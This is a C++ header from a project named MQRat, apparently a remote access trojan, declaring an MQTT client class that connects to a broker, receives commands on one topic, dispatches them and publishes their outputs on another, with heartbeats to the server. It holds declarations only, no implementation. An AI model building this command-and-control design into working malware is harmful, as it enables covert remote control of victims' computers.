/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <cstdint>
#include <string>
#include <vector>
#include "paho/include/MQTTClient.h"
#include "paho/include/MQTTClientPersistence.h"
#include "command_dispatcher.hpp"

#define CLIENT_ID_LENGTH    32

using namespace std;

/**
 * @brief MQTT Client class
 */
class MqttClient {

public:
	MqttClient();
	explicit MqttClient(unsigned qos_level, string broker_hostname);
	
	/**
	 * @brief Set the up mqtt client object
	 * 
	 * @return true on success
	 * @return false on error
	 */
	bool Setup();

	/**
	 * @brief Publishes a message into a predetermined topic
	 * 
	 * @param data message
	 * @param topic topic name
	 */
	void Publish(string data, string topic);	
	
	/**
	 * @brief ublishes a message into a predetermined topic
	 * 
	 * @param data Message to be published
	 * @param topic Topic name
	 */
	void Publish(vector<string> data, string topic);

	/**
	 * @brief Subscribe to a specific topic
	 * 
	 * @param topic Topic name
	 */
	void Subscribe(std::string topic);

	/**
	 * @brief Subscribe to internal topic
	 * 
	 */
	void Subscribe();

	/**
	 * @brief Get the Client object
	 * 
	 * @return MQTTClient a handle to MQTT client
	 */
	MQTTClient GetClient();

	/**
	 * @brief Called when mqtt client losts the connection
	 * 
	 * @param context 
	 * @param cause 
	 */
	void OnConnectionLost(void *context, char *cause);

	/**
	 * @brief Called when a new message is received
	 * 
	 * @param context 
	 * @param topic 
	 * @param topic_len 
	 * @param message 
	 * @return int 
	 */
	int OnMessageReceived(void *context, char *topic, int topic_len, MQTTClient_message *message);

	/**
	 * @brief Called when the message is delivered to broker
	 * 
	 * @param context 
	 * @param token 
	 */
	void OnDelivered(void* context, MQTTClient_deliveryToken dt);

	/**
	 * @brief connects to MQTT broker
	 *
	 */
	void Connect();

	/**
	 * @brief Loop forever
	 * 
	 */
	void Loop();

	/**
	 * @brief Sets the topic name used to send command outputs
	 * 
	 * @param new_topic 
	 */
	void setSendTopic(string new_topic);

	/**
	 * @brief Gets the name of topic used to send command outputs
	 * 
	 * @return string topic name
	 */
	string getSendTopic();

	/**
	 * @brief Gets the name of topic used to receive commands
	 * 
	 * @return string Topic name
	 */
	string getRecvTopic();

	/**
	 * @brief Sets the name of topic used to receive commands
	 * 
	 * @param new_topic Topic name
	 */
	void setRecvTopic(string new_topic);
private:
	/**
	 * @brief Configure MQTT client options
	 * 
	 * @param options client options
	 */
	void ConfigureOptions(MQTTClient_connectOptions *options);
	
	/**
	 * @brief Internal method to let server know that's a new client ready
	 * 
	 */
	void SendHeartbeat();

private:
	unsigned qos;
	MQTTClient client;
	string broker_host;
	unsigned reconnect_timeout;
	CommandDispatcher *dispatcher;
	string send_topic;
	string recv_topic;
};


